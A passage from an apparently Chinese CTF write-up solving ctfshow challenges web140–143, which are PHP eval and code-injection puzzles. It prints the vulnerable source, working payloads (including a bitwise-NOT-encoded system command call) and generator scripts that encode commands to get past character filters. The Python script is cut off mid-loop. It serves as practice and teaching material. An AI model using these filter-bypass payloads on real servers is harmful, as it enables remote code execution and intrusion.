<h4 id="web140">web140<a hidden class="anchor" aria-hidden="true" href="#web140">#</a></h4>
<p>函数的利用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 12:39:25
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$f1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$f2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$f1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$f2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$f1</span><span class="s2">(</span><span class="si">$f2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><a href="https://ctf.show/writeups/743106">原文</a></p>
<p>需要<code>$f1($f2());</code>的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。</p>
<p><strong>payload1</strong>： system(system())&mdash;&gt; <code>f1=system&amp;f2=system</code></p>
<p><code>string system( string $command[, int &amp;$return_var] )</code>：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(&lsquo;FLASE&rsquo;)，空指令，失败返回FLASE。</p>
<p><strong>payload2</strong>： usleep(usleep())&mdash;&gt; <code>f1=usleep&amp;f2=usleep</code> usleep没有返回值。 所以intval参数为空，失败返回0</p>
<p><strong>payload3</strong>： getdate(getdate())&mdash;&gt; <code>f1=getdate&amp;f2=getdate</code></p>
<p><code>array getdate([ int $timestamp = time()] )</code>：返回结果是array，参数必须是int型。所以getdate(getdate())&mdash;-&gt;getdate(array型)&mdash;&gt;失败返回flase，intval为0。</p>
<h4 id="web141">web141<a hidden class="anchor" aria-hidden="true" href="#web141">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 19:28:09
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">#error_reporting(0);
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\W+$/&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>preg_match(&#39;/^\W+$/&#39;, $v3)
</code></pre><p>此正则表达式用于检查字符串 <code>$v3</code> <strong>是否完全由非单词字符组成</strong>，且<strong>不能为空</strong>。（单词字符：字母、数字和下划线）</p>
<p>根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行</p>
<blockquote>
<p>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1&amp;v2=1&amp;v3=-phpinfo()-</p></blockquote>
<p>羽师傅有个取反脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1">//在命令行中运行
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span><span class="s1">&#39;[+]your function: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$system</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span> 
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span><span class="s1">&#39;[+]your command: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$command</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span> 
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="s1">&#39;[*] (~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$system</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)(~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$command</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>直接用就行</p>
<p><img alt="image-20250124220654185" loading="lazy" src="assets/image-20250124220654185.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-
</code></pre><h4 id="web142">web142<a hidden class="anchor" aria-hidden="true" href="#web142">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 19:36:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$v1</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">sleep</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=0
</code></pre><h4 id="web143">web143<a hidden class="anchor" aria-hidden="true" href="#web143">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 12:48:14
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了取反，只能用其他位运算符构造payload</p>
<p>羽师傅的异或脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i&#39;</span><span class="p">;</span> <span class="c1">//根据题目给的正则表达式修改即可
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="c1"></span>		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">^</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># author yu22x</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">               <span class="c1">#print(i)</span>
